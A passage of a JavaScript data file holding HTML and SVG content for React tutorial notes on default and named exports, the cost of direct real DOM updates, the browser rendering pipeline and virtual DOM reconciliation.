                <svg viewBox="0 0 880 250" class="arch-svg" role="img" aria-label="Diagram showing app.js exporting 1 default user and 2 named exports age and skills, and script.js receiving them in a single combined import statement">
                  <!-- Producer: app.js -->
                  <g transform="translate(30, 20)">
                    <rect x="0" y="0" width="370" height="210" rx="12" fill="var(--bg-subsection)" stroke="var(--border-strong)" stroke-width="1.6"/>
                    <text x="185" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">PRODUCER MODULE · app.js</text>
                    <text x="185" y="52" text-anchor="middle" class="svg-title">1 Default + 2 Named Exports</text>

                    <!-- Default Channel -->
                    <rect x="25" y="70" width="320" height="40" rx="6" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="185" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">export default user ('Sarthak')</text>

                    <!-- Named Channel 1 -->
                    <rect x="25" y="118" width="155" height="40" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="102" y="143" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:600;">export const age = 89</text>

                    <!-- Named Channel 2 -->
                    <rect x="190" y="118" width="155" height="40" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="267" y="143" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:600;">export const skills = [...]</text>

                    <text x="185" y="190" text-anchor="middle" class="svg-sub" style="font-size:11px;">Single module serves multiple consumers</text>
                  </g>

                  <!-- Bridges -->
                  <g transform="translate(415, 75)">
                    <!-- Arrow 1 Default -->
                    <line x1="0" y1="15" x2="45" y2="15" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="45,10 55,15 45,20" fill="var(--accent)"/>
                    <!-- Arrow 2 Named -->
                    <line x1="0" y1="65" x2="45" y2="65" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="45,60 55,65 45,70" fill="var(--primary)"/>
                  </g>

                  <!-- Consumer: script.js -->
                  <g transform="translate(480, 20)">
                    <rect x="0" y="0" width="370" height="210" rx="12" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="185" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">CONSUMER MODULE · script.js</text>
                    <text x="185" y="52" text-anchor="middle" class="svg-title">Single Combined Import</text>

                    <rect x="20" y="70" width="330" height="50" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="185" y="100" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700; font-size:12px;">import naam, { age, skills } from './app.js'</text>

                    <rect x="20" y="130" width="330" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="35" y="152" class="svg-mono-xs" style="fill:var(--accent);">naam → 'Sarthak' (Default, aliased)</text>
                    <text x="35" y="172" class="svg-mono-xs" style="fill:var(--primary);">age → 89 · skills → ['Frontend', ...]</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "5.5",
          title: "Quick Summary: Default Export vs. Named Export",
          content: `
            <div style="overflow-x:auto; margin:0.5rem 0 1rem;">
              <table class="spec-table" style="width:100%; border-collapse:collapse;">
                <thead>
                  <tr>
                    <th>Feature</th>
                    <th>Default Export (export default)</th>
                    <th>Named Export (export const ...)</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Export Syntax</strong></td>
                    <td><code>export default user;</code></td>
                    <td><code>export const age = 89;</code></td>
                  </tr>
                  <tr>
                    <td><strong>Import Syntax</strong></td>
                    <td><code>import anyName from './app.js';</code></td>
                    <td><code>import { age, skills } from './app.js';</code></td>
                  </tr>
                  <tr>
                    <td><strong>Curly Braces <code>{}</code></strong></td>
                    <td><span style="color:var(--success); font-weight:600;">NO curly braces</span></td>
                    <td><span style="color:var(--danger); font-weight:600;">MUST use curly braces {}</span></td>
                  </tr>
                  <tr>
                    <td><strong>Naming Freedom</strong></td>
                    <td>Can use <strong>ANY custom name</strong> on import</td>
                    <td>Must match <strong>exact exported name</strong></td>
                  </tr>
                  <tr>
                    <td><strong>Limit Per File</strong></td>
                    <td><strong>Strictly 1</strong> default export per file</td>
                    <td><strong>Multiple</strong> named exports allowed</td>
                  </tr>
                  <tr>
                    <td><strong>Typical React Use Case</strong></td>
                    <td>Main React Component (e.g. <code>export default Button</code>)</td>
                    <td>Helper utils, constants, icons, sub-types</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div class="callout-highlight-box">
              <span class="callout-highlight-tag">Golden Rule for React Engineers</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary); font-weight:500;">
                If you are importing a <strong>Default Export</strong>, write the name directly with <strong>no curly braces</strong> (e.g., <code>import React from 'react'</code>).<br>
                If you are importing <strong>Named Exports</strong>, always put them inside <strong>curly braces <code>{}</code></strong> (e.g., <code>import { useState, useEffect } from 'react'</code>).
              </p>
            </div>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 6: REAL DOM & WHY DIRECT DOM UPDATES ARE INEFFICIENT
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-06-real-dom-inefficiency",
      number: "06",
      shortLabel: "Real DOM Inefficiencies",
      title: "Real DOM & Why Direct DOM Updates Are Inefficient",
      summary: "The browser's live tree structure, why modifying the Real DOM directly triggers expensive reflows and repaints, and the button & heading text mutation problem.",
      subtopicLabels: ["6.1 What Is Real DOM?", "6.2 Direct Mutation Problem", "6.3 Browser Reflow Cost"],
      diagramCount: 2,
      sections: [
        {
          num: "6.1",
          title: "What Is the Real DOM?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Core Definition:</strong> The <strong>Real DOM (Document Object Model)</strong> is the actual live tree structure of your web page constructed and rendered in memory by the browser engine.</li>
              <li><strong>What It Contains:</strong> Every single HTML element you write—<code>&lt;html&gt;</code>, <code>&lt;body&gt;</code>, <code>&lt;header&gt;</code>, <code>&lt;h1&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;p&gt;</code>—lives as an active node inside this live hierarchical tree.</li>
              <li><strong>Traditional Web Architecture:</strong>
                <ul class="notes-sub-list">
                  <li>In traditional websites built using plain HTML, CSS, and Vanilla JavaScript, any UI update directly mutates this <strong>Real DOM</strong> (using methods like <code>document.getElementById()</code>, <code>innerHTML</code>, or <code>appendChild()</code>).</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "6.2",
          title: "The Problem With Updating the Real DOM Directly",
          content: `
            <div class="callout-highlight-box">
              <span class="callout-highlight-tag">The &lt;button&gt; &amp; &lt;h1&gt; Dilemma</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary);">
                Imagine a simple webpage with a <strong><code>&lt;button&gt;</code></strong> and an <strong><code>&lt;h1&gt;</code></strong> heading. On clicking the button, your code only needs to change the text of that single <strong><code>&lt;h1&gt;</code></strong>.
              </p>
            </div>

            <ul class="notes-bullet-list" style="margin-top:1rem;">
              <li><strong>What Happens in Traditional Real DOM Updates?</strong>
                <ul class="notes-sub-list">
                  <li>When JavaScript directly changes that <code>&lt;h1&gt;</code> element, the browser engine cannot easily isolate that text change without recalculating surrounding geometry.</li>
                  <li>Directly updating the Real DOM forces heavy overhead: <strong>re-calculating the layout, recalculating styles, and re-rendering branches of the DOM tree</strong> just to change one tiny string of text!</li>
                </ul>
              </li>
              <li><strong>The Performance Cost:</strong>
                <ul class="notes-sub-list">
                  <li>For a tiny toy webpage with 10 elements, you won't notice the lag.</li>
                  <li>However, in modern web applications containing <strong>thousands of nested nodes</strong> (feeds, chats, sidebars, video players, comments), frequent direct DOM mutations choke the browser's main thread.</li>
                  <li><strong>The Result:</strong> The browser does massive amounts of unnecessary extra work, causing dropped animation frames, stuttering scroll, high battery drain, and sluggish responsiveness.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 6.1 · Direct Real DOM Mutation Bottleneck: Heavy Cascading Reflow</span>
                <span class="diagram-frame-tag">TRADITIONAL IMPERATIVE WEB PROBLEM</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing direct Real DOM mutation where clicking a button triggers cascading layout reflow and repaint across unchanged DOM nodes">
                  <!-- Trigger Box -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="190" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
                    <text x="95" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">USER INTERACTION</text>
                    <text x="95" y="54" text-anchor="middle" class="svg-title">Button Click</text>
                    <rect x="15" y="70" width="160" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="95" y="96" text-anchor="middle" class="svg-mono-xs">&lt;button&gt; Clicked</text>
                    <text x="95" y="132" text-anchor="middle" class="svg-sub">Target: Update &lt;h1&gt; text</text>
                    <text x="95" y="152" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-size:10px;">Direct DOM Call</text>
                  </g>

                  <!-- Pipe 1 -->
                  <g transform="translate(225, 100)">
                    <line x1="0" y1="12" x2="35" y2="12" stroke="var(--danger)" stroke-width="2"/>
                    <polygon points="35,7 45,12 35,17" fill="var(--danger)"/>
                  </g>

                  <!-- Real DOM Tree -->
                  <g transform="translate(275, 25)">
                    <rect x="0" y="0" width="310" height="175" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="155" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">LIVE BROWSER REAL DOM</text>
                    <text x="155" y="52" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Cascading Tree Mutation</text>

                    <!-- Tree Nodes -->
                    <rect x="20" y="68" width="80" height="32" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2" stroke="var(--danger)"/>
                    <text x="60" y="89" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">&lt;h1&gt; *</text>

                    <rect x="115" y="68" width="80" height="32" rx="4" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="155" y="89" text-anchor="middle" class="svg-mono-xs">&lt;button&gt;</text>

                    <rect x="210" y="68" width="80" height="32" rx="4" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="250" y="89" text-anchor="middle" class="svg-mono-xs">&lt;div.card&gt;</text>

                    <rect x="20" y="112" width="270" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--danger)" stroke-dasharray="3 3"/>
                    <text x="155" y="132" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:600;">💥 Unnecessary Full-Tree Re-render</text>
                    <text x="155" y="148" text-anchor="middle" class="svg-sub">Unchanged elements forced to recalculate layout</text>
                  </g>

                  <!-- Pipe 2 -->
                  <g transform="translate(595, 100)">
                    <line x1="0" y1="12" x2="35" y2="12" stroke="var(--danger)" stroke-width="2"/>
                    <polygon points="35,7 45,12 35,17" fill="var(--danger)"/>
                  </g>

                  <!-- Engine Penalty -->
                  <g transform="translate(640, 25)">
                    <rect x="0" y="0" width="215" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.5"/>
                    <text x="107" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">BROWSER ENGINE</text>
                    <text x="107" y="52" text-anchor="middle" class="svg-title">Reflow & Repaint</text>
                    <rect x="15" y="68" width="185" height="36" rx="6" fill="var(--danger-bg)" stroke="var(--danger)"/>
                    <text x="107" y="91" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:600;">Layout Reflow (Heavy)</text>
                    <rect x="15" y="112" width="185" height="36" rx="6" fill="var(--danger-bg)" stroke="var(--danger)"/>
                    <text x="107" y="135" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:600;">Full Raster Repaint</text>
                    <text x="107" y="162" text-anchor="middle" class="svg-sub" style="font-size:10px;">Blocks UI Thread · Slow FPS</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "6.3",
          title: "The 5-Stage Browser Rendering Engine Pipeline",
          content: `
            <p style="color:var(--text-secondary); margin-bottom:1rem;">
              To understand why direct Real DOM updates are so inefficient, look at what the browser's C++ rendering engine (Blink / WebKit / Gecko) must execute whenever the DOM is touched:
            </p>

            <div class="sub-card-grid-3">
              <div class="sub-box">
                <div class="sub-box__tag">Stage 01 & 02 · Setup</div>
                <div class="sub-box__title">JavaScript & Styles</div>
                <div class="sub-box__body">
                  1. <strong>JS Execution:</strong> Code mutates a node via the DOM API.<br>
                  2. <strong>Style Recalculation:</strong> Browser re-evaluates all matching CSS selectors across the DOM tree.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Stage 03 · The Costliest</div>
                <div class="sub-box__title">Layout / Reflow</div>
                <div class="sub-box__body">
                  3. <strong>Layout:</strong> The browser calculates the exact geometry, coordinates, margins, and bounding boxes of every affected element on the page.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Stage 04 & 05 · Pixels</div>
                <div class="sub-box__title">Paint & Composite</div>
                <div class="sub-box__body">
                  4. <strong>Repaint:</strong> Rasterizes text, colors, and shadows into bitmap pixels.<br>
                  5. <strong>Compositing:</strong> Sends GPU layers to the physical screen.
                </div>
              </div>
            </div>

            <div class="callout-highlight-box" style="margin-top:1.25rem;">
              <span class="callout-highlight-tag">Core Takeaway</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary); font-weight:500;">
                JavaScript itself is blazingly fast in modern engines (V8). The bottleneck is <strong>touching the Real DOM</strong>, because crossing into the browser's C++ DOM tree triggers heavy Layout and Repaint loops.
              </p>
            </div>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 6.2 · 5-Stage Browser Rendering Pipeline (DOM Mutation Cost)</span>
                <span class="diagram-frame-tag">BROWSER RENDERING ENGINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 185" class="arch-svg" role="img" aria-label="5-stage browser rendering engine pipeline from DOM manipulation to layout, paint, and screen compositing">
                  <!-- Stage 1 & 2: Parse & Style -->
                  <g transform="translate(20, 20)">
                    <rect x="0" y="0" width="155" height="145" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="77" y="24" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">STAGE 1 &amp; 2</text>
                    <text x="77" y="46" text-anchor="middle" class="svg-title">DOM &amp; Styles</text>
                    <rect x="10" y="60" width="135" height="72" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="77" y="82" text-anchor="middle" class="svg-mono-xs">• JS mutates DOM</text>
                    <text x="77" y="100" text-anchor="middle" class="svg-mono-xs">• CSSOM recalculates</text>
                    <text x="77" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">Matches all rules</text>
                  </g>

                  <!-- Arrow 1 -->
                  <line x1="175" y1="92" x2="195" y2="92" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="195,88 203,92 195,96" fill="var(--primary)"/>

                  <!-- Stage 3: Render Tree -->
                  <g transform="translate(205, 20)">
                    <rect x="0" y="0" width="155" height="145" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="77" y="24" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">INTERMEDIATE</text>
                    <text x="77" y="46" text-anchor="middle" class="svg-title">Render Tree</text>
                    <rect x="10" y="60" width="135" height="72" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="77" y="82" text-anchor="middle" class="svg-mono-xs">• Visible nodes only</text>
                    <text x="77" y="100" text-anchor="middle" class="svg-mono-xs">• Filters display:none</text>
                    <text x="77" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">Tree construction</text>
                  </g>

                  <!-- Arrow 2 -->
                  <line x1="360" y1="92" x2="380" y2="92" stroke="var(--danger)" stroke-width="2"/>
                  <polygon points="380,88 388,92 380,96" fill="var(--danger)"/>

                  <!-- Stage 4: Layout / Reflow (HEAVY) -->
                  <g transform="translate(390, 20)">
                    <rect x="0" y="0" width="165" height="145" rx="8" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="10" width="174" height="18" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="102" y="23" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">STAGE 3 · BOTTLENECK</text>
                    <text x="82" y="48" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Layout / Reflow</text>
                    <rect x="10" y="60" width="145" height="72" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="82" y="82" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">• Exact geometry (X,Y)</text>
                    <text x="82" y="100" text-anchor="middle" class="svg-mono-xs">• Recalculates boxes</text>
                    <text x="82" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger);">Heavy CPU spike ⚠</text>
                  </g>

                  <!-- Arrow 3 -->
                  <line x1="555" y1="92" x2="575" y2="92" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="575,88 583,92 575,96" fill="var(--primary)"/>

                  <!-- Stage 5: Paint -->
                  <g transform="translate(585, 20)">
                    <rect x="0" y="0" width="135" height="145" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="67" y="24" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">STAGE 4</text>
                    <text x="67" y="46" text-anchor="middle" class="svg-title">Paint / Draw</text>
                    <rect x="10" y="60" width="115" height="72" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="67" y="82" text-anchor="middle" class="svg-mono-xs">• Rasterize pixels</text>
                    <text x="67" y="100" text-anchor="middle" class="svg-mono-xs">• Colors, borders</text>
                    <text x="67" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">Bitmap creation</text>
                  </g>

                  <!-- Arrow 4 -->
                  <line x1="720" y1="92" x2="735" y2="92" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="735,88 743,92 735,96" fill="var(--success)"/>

                  <!-- Stage 6: Composite -->
                  <g transform="translate(745, 20)">
                    <rect x="0" y="0" width="115" height="145" rx="8" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="57" y="24" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">STAGE 5</text>
                    <text x="57" y="46" text-anchor="middle" class="svg-title" style="fill:var(--success);">Composite</text>
                    <rect x="8" y="60" width="99" height="72" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="57" y="82" text-anchor="middle" class="svg-mono-xs">• GPU layers</text>
                    <text x="57" y="100" text-anchor="middle" class="svg-mono-xs">• Hardware accel</text>
                    <text x="57" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Screen Render ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 7: VIRTUAL DOM — HOW REACT SOLVES THE PERFORMANCE PROBLEM
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-07-virtual-dom-reconciliation",
      number: "07",
      shortLabel: "Virtual DOM & Reconciliation",
      title: "Virtual DOM — How React Solves the Performance Problem",
      summary: "React's lightweight in-memory DOM copy, 3-step reconciliation diffing algorithm, targeted surgical DOM patches, and real-world YouTube & Instagram case studies.",
      subtopicLabels: ["7.1 What Is Virtual DOM?", "7.2 3-Step Reconciliation", "7.3 YouTube & Instagram Cases", "7.4 Key Benefits"],
      diagramCount: 2,
      sections: [
        {
          num: "7.1",
          title: "What Is the Virtual DOM?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Simple Definition:</strong> To avoid unnecessary full DOM re-renders, React introduced the <strong>Virtual DOM</strong>—a <strong>lightweight in-memory copy of the Real DOM</strong> maintained entirely inside JavaScript objects.</li>
              <li><strong>How Many Copies Does React Make?</strong>
                <ul class="notes-sub-list">
                  <li>Technically, React maintains <strong>one primary in-memory model</strong> of the DOM structure.</li>
                  <li>During updates, React keeps the <strong>previous snapshot</strong> and builds a <strong>new updated snapshot</strong> (maintaining 2–3 representations in memory) to compare differences.</li>
                </ul>
              </li>
              <li><strong>Why Is It So Fast?</strong>
                <ul class="notes-sub-list">
                  <li>The Virtual DOM is simply a plain JavaScript object tree (e.g., <code>{ type: 'h1', props: { children: 'Hello' } }</code>).</li>
                  <li>Creating, reading, and comparing JavaScript objects in memory takes microseconds and triggers <strong>zero browser reflows or repaints</strong>!</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "7.2",
          title: "How Virtual DOM Works Step-by-Step (Example)",
          content: `
            <div class="callout-highlight-box">
              <span class="callout-highlight-tag">The 3-Step Reconciliation Pipeline</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary);">
                When you click a <strong><code>&lt;button&gt;</code></strong> to update an <strong><code>&lt;h1&gt;</code></strong> in React, the browser does NOT touch the Real DOM immediately. Here is the exact 3-step process:
              </p>
            </div>

            <div class="sub-card-grid-3" style="margin-top:1.15rem;">
              <div class="sub-box">
                <div class="sub-box__tag">Step 01 · In-Memory Mutation</div>
                <div class="sub-box__title">1. Change in Copy</div>
                <div class="sub-box__body">
                  Instead of touching the live screen, React registers the <code>&lt;h1&gt;</code> text change inside its lightweight <strong>Virtual DOM copy</strong>.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Step 02 · Diffing Algorithm</div>
                <div class="sub-box__title">2. Spot the Difference</div>
                <div class="sub-box__body">
                  React compares the updated Virtual DOM against the previous snapshot (a fast process called <strong>Diffing</strong>) to pinpoint exactly what changed.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Step 03 · Surgical Patch</div>
                <div class="sub-box__title">3. Targeted Update</div>
                <div class="sub-box__body">
                  React applies <strong>only the changed part</strong> (updating solely that single <code>&lt;h1&gt;</code>) to the Real DOM—leaving every other element completely untouched!
                </div>
              </div>
            </div>

            <div class="formula-box" style="margin-top:1.25rem;">
              Golden Rule: Make a Copy → Spot Only What Changed → Surgically Patch Only That Element in Real DOM
            </div>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 7.1 · Virtual DOM 3-Step Reconciliation & Surgical DOM Patching</span>
                <span class="diagram-frame-tag">REACT RECONCILIATION ENGINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 250" class="arch-svg" role="img" aria-label="Diagram showing Virtual DOM reconciliation: Step 1 in-memory update, Step 2 diffing against previous snapshot, Step 3 surgical targeted patch to the Real DOM">
                  <!-- Step 1: Virtual DOM -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="250" height="205" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="125" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">STEP 1 · IN-MEMORY COPY</text>
                    <text x="125" y="52" text-anchor="middle" class="svg-title">Virtual DOM Snapshot</text>

                    <rect x="18" y="70" width="214" height="42" rx="6" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="125" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">h1: "Updated Text" ✓</text>

                    <rect x="18" y="122" width="214" height="34" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="144" text-anchor="middle" class="svg-sub">button: "Click Me" (Same)</text>

                    <text x="125" y="185" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-size:10px;">Zero Browser Reflow Yet</text>
                  </g>

                  <!-- Pipe 1 -->
                  <g transform="translate(285, 110)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="35,5 45,10 35,15" fill="var(--accent)"/>
                    <text x="22" y="0" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">diff</text>
                  </g>

                  <!-- Step 2: Diffing -->
                  <g transform="translate(335, 20)">
                    <rect x="0" y="0" width="245" height="205" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="122" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">STEP 2 · DIFFING ENGINE</text>
                    <text x="122" y="52" text-anchor="middle" class="svg-title">Spot What Changed</text>

                    <rect x="15" y="70" width="215" height="54" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="122" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">Delta Isolated: 1 Node</text>
                    <text x="122" y="112" text-anchor="middle" class="svg-sub">&lt;h1&gt; text differs · button identical</text>

                    <rect x="15" y="134" width="215" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="122" y="160" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">Computes Minimal Patch</text>
                  </g>

                  <!-- Pipe 2 -->
                  <g transform="translate(590, 110)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="35,5 45,10 35,15" fill="var(--success)"/>
                    <text x="22" y="0" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--success);">patch</text>
                  </g>

                  <!-- Step 3: Targeted Real DOM -->
                  <g transform="translate(635, 20)">
                    <rect x="0" y="0" width="220" height="205" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="110" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">STEP 3 · REAL DOM</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Targeted Surgical Update</text>

                    <rect x="15" y="70" width="190" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="105" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;h1&gt; Patched Only ✓</text>

                    <rect x="15" y="122" width="190" height="34" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="105" y="144" text-anchor="middle" class="svg-sub">button untouched (0 reflow)</text>

                    <text x="110" y="185" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">✨ Fluid 60fps Performance</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "7.3",
          title: "Real-World Examples of Targeted Updates",
          content: `
            <div class="sub-card-grid-2">
              <div class="sub-box">
                <div class="sub-box__tag">Example 01 · State Retention</div>
                <div class="sub-box__title">📺 YouTube Search Bar Case</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li>Suppose you type <code>Sheryians Coding School</code> into the YouTube search bar and click different video results.</li>
                    <li>The video player loads, recommendations change, comments render, and the URL updates dynamically.</li>
                    <li><strong>Notice:</strong> The text you typed inside the search bar stays completely intact—it does <strong>not reload, flicker, or re-render</strong> because its state never changed!</li>
                  </ul>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Example 02 · Surgical Mutation</div>
                <div class="sub-box__title">💬 Instagram Chat Badge Case</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li>Suppose your Instagram chat icon shows an unread notification badge of <strong><code>4</code></strong>.</li>
                    <li>When a 5th friend messages you, <strong>only that tiny badge number updates from <code>4</code> to <code>5</code></strong>.</li>
                    <li>The rest of the entire webpage (stories bar, photo feed, reels tab) does <strong>NOT</strong> reload or re-render just to increment one digit.</li>
                  </ul>
                </div>
              </div>
            </div>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 7.2 · Real-World Targeted UI State Preservation: YouTube & Instagram</span>
                <span class="diagram-frame-tag">PRODUCTION CASE STUDIES</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing YouTube search bar state preservation while videos load, and Instagram chat notification badge incrementing from 4 to 5 without feed re-renders">
                  <!-- YouTube Panel -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="200" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">YOUTUBE TARGETED STATE EXAMPLE</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title">Search Bar Text Preserved</text>

                    <!-- Search Bar Node (Untouched) -->
                    <rect x="25" y="70" width="350" height="42" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="200" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">🔍 Search input preserved [UNTOUCHED ✓]</text>

                    <!-- Feeds Node (Updated) -->
                    <rect x="25" y="122" width="350" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="200" y="142" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary);">Video Player & Comments Updated Dynamically</text>
                    <text x="200" y="158" text-anchor="middle" class="svg-sub">Search input never loses focus or typed text</text>
                  </g>

                  <!-- Instagram Panel -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
